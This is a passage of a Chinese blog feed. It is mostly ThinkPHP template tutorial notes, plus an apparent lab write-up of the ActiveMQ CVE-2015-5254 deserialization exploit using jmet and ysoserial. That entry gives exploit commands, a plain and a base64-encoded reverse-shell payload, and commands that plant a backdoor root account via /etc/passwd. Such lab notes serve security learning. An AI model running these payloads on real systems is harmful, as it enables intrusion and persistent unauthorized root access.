class="headerlink" title="模版的布局和继承"></a>模版的布局和继承</h2><h3 id="模版的布局"><a href="#模版的布局" class="headerlink" title="模版的布局"></a>模版的布局</h3><p>开启布局功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">template.php</span><br><span class="line">&#39;layout_on&#39; &#x3D;&gt; true,</span><br><span class="line">&#x2F;&#x2F; 改变模版位置</span><br><span class="line">  &#39;layout_name&#39; &#x3D;&gt; &#39;public&#x2F;layout&#39;,</span><br><span class="line">  &#x2F;&#x2F;更改__content__</span><br><span class="line">  &#39;layout_item&#39; &#x3D;&gt; &#39;&#123;__REPLACE__&#125;&#39;</span><br></pre></td></tr></table></figure><p>然后模版开启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;include file&#x3D;&#39;public&#x2F;header&#39; title&#x3D;&#39;$title&#39; keywords&#x3D;&#39;模版&#39;&#x2F;&#125;</span><br><span class="line">&#123;__CONTENT__&#125;&#x2F;&#x2F;引入index.html中的内容</span><br><span class="line">&#123;include file&#x3D;&#39;..&#x2F;application&#x2F;view&#x2F;public&#x2F;footer.html&#39;&#125;</span><br></pre></td></tr></table></figure><h3 id="第二种打开模版"><a href="#第二种打开模版" class="headerlink" title="第二种打开模版"></a>第二种打开模版</h3><p>index.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;layout name&#x3D;&quot;public&#x2F;layout&quot; repalce&#x3D;&#39;[__CONTENT__]&#39;&#125;</span><br><span class="line">主体</span><br></pre></td></tr></table></figure><h3 id="第三种打开模版"><a href="#第三种打开模版" class="headerlink" title="第三种打开模版"></a>第三种打开模版</h3><p>在C端实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;view-&gt;engine-&gt;layout(true);&#x2F;&#x2F;如果不使用默认路径还是需要更改配置</span><br></pre></td></tr></table></figure><h2 id="模版继承"><a href="#模版继承" class="headerlink" title="模版继承"></a>模版继承</h2><p>首先创建一个类似于父类的东西</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;$title&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;block name=&#x27;nav&#x27;&#125;nav&#123;/block&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;block name=&#x27;footer&#x27;&#125; @ThinkPHP 版权所有 &#123;/block&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意其中有两个block标签，是用来进行占位的</p><p>然后进行调用 <code>&#123;__block__&#125;</code>这是用来引用原来的基类中的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;extend name&#x3D;&#39;public&#x2F;base&#39;&#125;</span><br><span class="line">&#123;extend name&#x3D;&#39;..&#x2F;application&#x2F;view&#x2F;public&#x2F;base.html&#39;&#125;</span><br><span class="line">&#123;block name&#x3D;&#39;nav&#39;&#125;</span><br><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li&gt;首页&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;分类&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;关于&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ol&gt;</span><br><span class="line">&#123;&#x2F;block&#125;</span><br><span class="line">&#123;block name&#x3D;&#39;footer&#39;&#125;</span><br><span class="line">I LOVE YOU &#123;__block__&#125;</span><br><span class="line">&#123;&#x2F;block&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ThinkPhp-5&quot;&gt;&lt;a href=&quot;#ThinkPhp-5&quot; class=&quot;headerlink&quot; title=&quot;ThinkPhp-5&quot;&gt;&lt;/a&gt;ThinkPhp-5&lt;/h1&gt;&lt;h2 id=&quot;模版的条件判断标签&quot;&gt;&lt;a href=&quot;#模版的条件判断标签&quot; class=&quot;headerlink&quot; title=&quot;模版的条件判断标签&quot;&gt;&lt;/a&gt;模版的条件判断标签&lt;/h2&gt;&lt;h3 id=&quot;switch&quot;&gt;&lt;a href=&quot;#switch&quot; class=&quot;headerlink&quot; title=&quot;switch&quot;&gt;&lt;/a&gt;switch&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;switch number&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;case 1&amp;#125;1&amp;#123;&amp;#x2F;case&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;case 5&amp;#125;5&amp;#123;&amp;#x2F;case&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;case 10&amp;#125;10&amp;#123;&amp;#x2F;case&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;default&amp;#x2F;&amp;#125;不存在 &amp;#123;&amp;#x2F;switch&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;if&quot;&gt;&lt;a href=&quot;#if&quot; class=&quot;headerlink&quot; title=&quot;if&quot;&gt;&lt;/a&gt;if&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;if ($number &amp;gt; 10) and ($number &amp;lt; 20)&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    6666&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;else if $number &amp;#x3D;&amp;#x3D; 10&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    8888&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&amp;#x2F;if&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="编程" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
    <category term="ThinkPHP" scheme="http://example.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2015-5254</title>
    <link href="http://example.com/2020/09/22/CVE-2015-5254/"/>
    <id>http://example.com/2020/09/22/CVE-2015-5254/</id>
    <published>2020-09-22T13:40:51.000Z</published>
    <updated>2020-09-23T16:09:14.790Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lt-ActiveMQ-反序列化漏洞-gt-待完全理解"><a href="#lt-ActiveMQ-反序列化漏洞-gt-待完全理解" class="headerlink" title="&lt;ActiveMQ 反序列化漏洞&gt;(待完全理解)"></a>&lt;ActiveMQ 反序列化漏洞&gt;(待完全理解)</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p><!--morer--><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞利用过程如下：</p><ol><li>构造（可以使用ysoserial）可执行命令的序列化对象</li><li>作为一个消息，发送给目标61616端口</li><li>访问web管理页面，读取消息，触发漏洞</li></ol><p>使用<a href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p><p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure><p>然后登陆页面</p><p><a href="http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event">http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event</a></p><p>点击消息，触发漏洞</p><p>然后进入docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it   9a540c50a8dc  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>如果在/tmp目录下存在success文件则显示成功</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;12340&gt;&amp;1&quot; -Yp ROME 127.0.0.1   61616</span><br></pre></td></tr></table></figure><p>外面用nc监听1234端口</p><p>注意把攻击的命令进行base64编码，绕过java本身的限制</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjE5Mi83Nzc3IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 192.168.43.192 61616</span><br></pre></td></tr></table></figure><h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -g root -s &#x2F;bin&#x2F;bash -u 10010 test</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s&#x2F;test:x:10010&#x2F;test:x:0&#x2F;g&quot; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test:sd123456&quot; | chpasswd</span><br></pre></td></tr></table></figure><p>到这里就可以完全创建一个具有root权限的用户，稍后进行远程登陆就可以了。</p><h2 id="jmet的使用"><a href="#jmet的使用" class="headerlink" title="jmet的使用"></a>jmet的使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar target&#x2F;jmet-0.1.0-all.jar</span><br><span class="line">ERROR d.c.j.JMET [main] Misconfiguration: Missing required options: [-C Custom script exploitation mode, -Y Deser exploitation mode, -X XXE exploitation mode], [-T topic name, -Q queue name], I</span><br><span class="line">usage: jmet [host] [port]</span><br><span class="line"> -C,--Custom &lt;scriptname&gt;         Custom script exploitation mode</span><br><span class="line"> -f,--filter &lt;scriptname&gt;         filter script</span><br><span class="line"> -I,--impl &lt;arg&gt;                  ActiveMQ| Artemis| WebSphereMQ| Qpid10|</span><br><span class="line">                                  Qpid09| HornetQ| SwiftMQ| RabbitMQ|</span><br><span class="line">                                  OpenMQ</span><br><span class="line"> -pw,--password &lt;pass&gt;            password for authentication</span><br><span class="line"> -Q,--Queue &lt;name&gt;                queue name</span><br><span class="line"> -s,--substitute                  Substituation mode: Use §§ to pass</span><br><span class="line">                                  ysoserial payload name to CMD</span><br><span class="line"> -T,--Topic &lt;name&gt;                topic name</span><br><span class="line"> -u,--user &lt;id&gt;                   user for authentication</span><br><span class="line"> -v,--verbose                     Running verbose mode</span><br><span class="line"> -X,--XXE &lt;URL&gt;                   XXE exploitation mode</span><br><span class="line"> -Xp,--xxepayload &lt;payloadname&gt;   Optional: XXE Payload to use EXTERNAL|</span><br><span class="line">                                  PARAMATER| DTD</span><br><span class="line"> -Y,--ysoserial &lt;CMD&gt;             Deser exploitation mode</span><br><span class="line"> -Yp,--payload &lt;payloadname&gt;      Optional: Ysoserial Payload to use</span><br><span class="line">                                  BeanShell1| CommonsBeanutils1|</span><br><span class="line">                                  CommonsCollections1|</span><br><span class="line">                                  CommonsCollections2|</span><br><span class="line">                                  CommonsCollections3|</span><br><span class="line">                                  CommonsCollections4|</span><br><span class="line">                                  CommonsCollections5| Groovy1|</span><br><span class="line">                                  Hibernate1| Hibernate2| Jdk7u21| JSON1|</span><br><span class="line">                                  ROME| Spring1| Spring2</span><br><span class="line"> -Zc,--channel &lt;channel&gt;          channel name (only WebSphereMQ)</span><br><span class="line"> -Zq,--queuemanager &lt;name&gt;        queue manager name (only WebSphereMQ)</span><br><span class="line"> -Zv,--vhost &lt;name&gt;               vhost name (only AMQP-Brokers:</span><br><span class="line">                                  RabbitMQ|QPid09|QPid10)</span><br></pre></td></tr></table></figure><p>其中的深层次的原理等待java+web学完之后回来补</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;lt-ActiveMQ-反序列化漏洞-gt-待完全理解&quot;&gt;&lt;a href=&quot;#lt-ActiveMQ-反序列化漏洞-gt-待完全理解&quot; class=&quot;headerlink&quot; title=&quot;&amp;lt;ActiveMQ 反序列化漏洞&amp;gt;(待完全理解)&quot;&gt;&lt;/a&gt;&amp;l</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="CVE" scheme="http://example.com/categories/CTF/CVE/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="CVE，未完全解决" scheme="http://example.com/tags/CVE%EF%BC%8C%E6%9C%AA%E5%AE%8C%E5%85%A8%E8%A7%A3%E5%86%B3/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPhp-4</title>
    <link href="http://example.com/2020/09/21/ThinkPhp-4/"/>
    <id>http://example.com/2020/09/21/ThinkPhp-4/</id>
    <published>2020-09-21T12:00:18.000Z</published>
    <updated>2020-09-21T12:46:28.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPhp-第4天"><a href="#ThinkPhp-第4天" class="headerlink" title="ThinkPhp - 第4天"></a>ThinkPhp - 第4天</h1><h2 id="模版引擎和视图渲染-V"><a href="#模版引擎和视图渲染-V" class="headerlink" title="模版引擎和视图渲染(V)"></a>模版引擎和视图渲染(V)</h2><p>模版定位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;指定模版</span><br><span class="line">      return $this-&gt;fetch(&#39;edit&#39;);#当前模块&#x2F;view&#x2F;当前控制器名(小写)&#x2F;当前操作(小写).html</span><br><span class="line">      &#x2F;&#x2F;指定目录下的模版</span><br><span class="line">      return $this-&gt;fetch(&#39;public&#x2F;edit&#39;);</span><br><span class="line">      &#x2F;&#x2F;指定模块下的模版</span><br><span class="line">      return $this-&gt;fetch(&#39;admin@public&#x2F;edit&#39;);</span><br><span class="line">      &#x2F;&#x2F;view_path 下的模版</span><br><span class="line">      return $this-&gt;fetch(&#39;&#x2F;edit&#39;);</span><br><span class="line">      &#x2F;&#x2F;助手函数view()</span><br><span class="line">      return view(&#39;&#39;)</span><br></pre></td></tr></table></figure><h2 id="视图赋值和过滤"><a href="#视图赋值和过滤" class="headerlink" title="视图赋值和过滤"></a>视图赋值和过滤</h2><a id="more"></a><h3 id="一、视图赋值"><a href="#一、视图赋值" class="headerlink" title="一、视图赋值"></a>一、视图赋值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;助手函数view()</span><br><span class="line">&#x2F;&#x2F;        return view(&#39;&#39;);</span><br><span class="line">&#x2F;&#x2F;        $this-&gt;assign(&#39;name&#39;,&#39;ThinkPHP&#39;);</span><br><span class="line">        $this-&gt;assign([</span><br><span class="line">            &quot;name&quot; &#x3D;&gt; &quot;Think&quot;,</span><br><span class="line">            &quot;word&quot; &#x3D;&gt; &quot;PHP&quot;,</span><br><span class="line">        ]);</span><br><span class="line">        return $this-&gt;fetch();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;        $content &#x3D; &#39;&#123;$name&#125;.&#123;$word&#125;&#39;;</span><br><span class="line">&#x2F;&#x2F;        return $this-&gt;display($content,[</span><br><span class="line">&#x2F;&#x2F;            &quot;name&quot; &#x3D;&gt; &quot;Think&quot;,</span><br><span class="line">&#x2F;&#x2F;            &quot;word&quot; &#x3D;&gt; &quot;PHP&quot;,</span><br><span class="line">&#x2F;&#x2F;        ]);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;        return view(&#39;index&#39;,[</span><br><span class="line">&#x2F;&#x2F;            &quot;name&quot; &#x3D;&gt; &quot;Think&quot;,</span><br><span class="line">&#x2F;&#x2F;            &quot;word&quot; &#x3D;&gt; &quot;PHP&quot;,</span><br><span class="line">&#x2F;&#x2F;        ]);</span><br><span class="line">        &#x2F;&#x2F;全局变量的赋值</span><br><span class="line">        \think\facade\View::share(&#39;name&#39;,&#39;value&#39;);</span><br><span class="line">        return $this-&gt;fetch(&#39;index&#39;);</span><br></pre></td></tr></table></figure><h3 id="二、视图过滤"><a href="#二、视图过滤" class="headerlink" title="二、视图过滤"></a>二、视图过滤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;assign([</span><br><span class="line">            &quot;name&quot; &#x3D;&gt; &quot;Think1&quot;,</span><br><span class="line">            &quot;word&quot; &#x3D;&gt; &quot;PHP&quot;,</span><br><span class="line">        ]);</span><br><span class="line">        return $this-&gt;filter(function ($value)&#123;</span><br><span class="line">            return str_replace(&quot;1&quot;,&#39;&lt;br&#x2F;&gt;&#39;,$value);</span><br><span class="line">        &#125;)-&gt;fetch();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;全局过滤</span><br><span class="line">      return $this-&gt;filter(function($content)&#123; return str_replace(&quot;1&quot;,&#39;&lt;br&#x2F;&gt;&#39;,$content); &#125;);</span><br></pre></td></tr></table></figure><h2 id="模版变量输出"><a href="#模版变量输出" class="headerlink" title="模版变量输出"></a>模版变量输出</h2><h3 id="变量输出"><a href="#变量输出" class="headerlink" title="变量输出"></a>变量输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">数组输出</span><br><span class="line">$data[&#39;username&#39;] &#x3D; &#39;辉夜&#39;;</span><br><span class="line">        $data[&#39;email&#39;] &#x3D; &#39;huiye@163.com&#39;;</span><br><span class="line">        $this-&gt;assign(&#39;user&#39;, $data);</span><br><span class="line">        return $this-&gt;fetch();</span><br><span class="line">        模版调用</span><br><span class="line">        &#123;$user.username&#125;.&#123;$user.email&#125;</span><br><span class="line">对象输出</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">对象输出</span><br><span class="line">$obj &#x3D; new \stdClass(); </span><br><span class="line">$obj-&gt;username &#x3D; &#39;辉夜&#39;; </span><br><span class="line">$obj-&gt;email &#x3D; &#39;huiye@163.com&#39;;</span><br><span class="line">$this-&gt;assign(&#39;obj&#39;, $obj);</span><br><span class="line">模版调用：&#123;$obj-&gt;username&#125;.&#123;$obj-&gt;email&#125; </span><br></pre></td></tr></table></figure><h3 id="其他输出"><a href="#其他输出" class="headerlink" title="其他输出"></a>其他输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">默认值</span><br><span class="line">&#123;$user.username|default&#x3D;&#39;没有用户名&#39;&#125;</span><br><span class="line">系统变量</span><br><span class="line">使用$Think.xxx.yyy 方式，可以输出系统的变量</span><br><span class="line">常量输出</span><br><span class="line">&#123;$Think.const.PHP_VERSION&#125; &#123;$Think.PHP_VERSION&#125;</span><br></pre></td></tr></table></figure><p><strong>系统配置</strong> <code>&#123;$Think.config.default_return_type&#125;</code></p><h2 id="模版中的函数与运算符"><a href="#模版中的函数与运算符" class="headerlink" title="模版中的函数与运算符"></a>模版中的函数与运算符</h2><h3 id="使用函数"><a href="#使用函数" class="headerlink" title="使用函数"></a>使用函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;$name|md5&#125; #管道符</span><br><span class="line">#系统默认在编译的会采用 htmlentities 过滤函数防止 XSS 跨站脚本攻击； </span><br><span class="line">可以更改默认函数：：&#39;default_filter&#39; &#x3D;&gt; &#39;htmlspecialchars&#39;</span><br><span class="line">&#123;$user[&#39;email&#39;]|raw&#125; 不进行实体转换</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">函数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">date</td><td align="center">格式化时间{$time|date=’Y-m-d’}</td></tr><tr><td align="center">format</td><td align="center">格式化字符串{$number</td></tr><tr><td align="center">upper</td><td align="center">转换为大写</td></tr><tr><td align="center">lower</td><td align="center">转换为小写</td></tr><tr><td align="center">first</td><td align="center">输出数组的第一个元素</td></tr><tr><td align="center">last</td><td align="center">输出数组的最后一个元素</td></tr><tr><td align="center">default</td><td align="center">默认值</td></tr><tr><td align="center">raw</td><td align="center">不使用转义</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;assign(&#39;time&#39;, time()); </span><br><span class="line">&#123;$time|date&#x3D;&#39;Y-m-d&#39;&#125;</span><br><span class="line"></span><br><span class="line">#如果函数有多个参数，可以用逗号隔开</span><br><span class="line">&#123;$name|substr&#x3D;0,3&#125;</span><br><span class="line">#多个函数同时执行</span><br><span class="line">使用|隔开，并且左到右执行</span><br><span class="line">#PHP语法模式</span><br><span class="line">&#123;:substr(strtoupper(md5($password)), 0, 3)&#125;</span><br></pre></td></tr></table></figure><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.四则运算</span><br><span class="line">&#123;$number + $number&#125;</span><br><span class="line">2.有运算时，函数不能使用</span><br><span class="line">3.三元运算</span><br><span class="line">&#123;$name ? &#39;正确&#39; : &#39;错误&#39;&#125; &#x2F;&#x2F;$name 为 true 返回正确，否则返回错误</span><br><span class="line">    &#123;$name ?&#x3D; &#39;真&#39;&#125; &#x2F;&#x2F;$name 为 true 返回真 </span><br><span class="line">    &#123;$Think.get.name ?? &#39;不存在&#39;&#125; &#x2F;&#x2F;??用于系统变量，没有值时输出 </span><br><span class="line">    &#123;$name ?: &#39;不存在&#39;&#125; &#x2F;&#x2F;?:用于普通变量，没有值时输出</span><br><span class="line">4. 三元运算符也支持运算后返回布尔值判断； &#123;$a &#x3D;&#x3D; $b ? &#39;真&#39; : &#39;假&#39;&#125;</span><br></pre></td></tr></table></figure><p>注意 <strong>??</strong> 时系统变量</p><h2 id="循环标签"><a href="#循环标签" class="headerlink" title="循环标签"></a>循环标签</h2><p>foreach循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$list &#x3D; UserModel::all();</span><br><span class="line">$this-&gt;assign(&#39;list&#39;, $list);</span><br><span class="line">return $this-&gt;fetch(&#39;user&#39;);</span><br><span class="line"></span><br><span class="line">#下面是模版调用</span><br><span class="line">&#123;foreach $list as 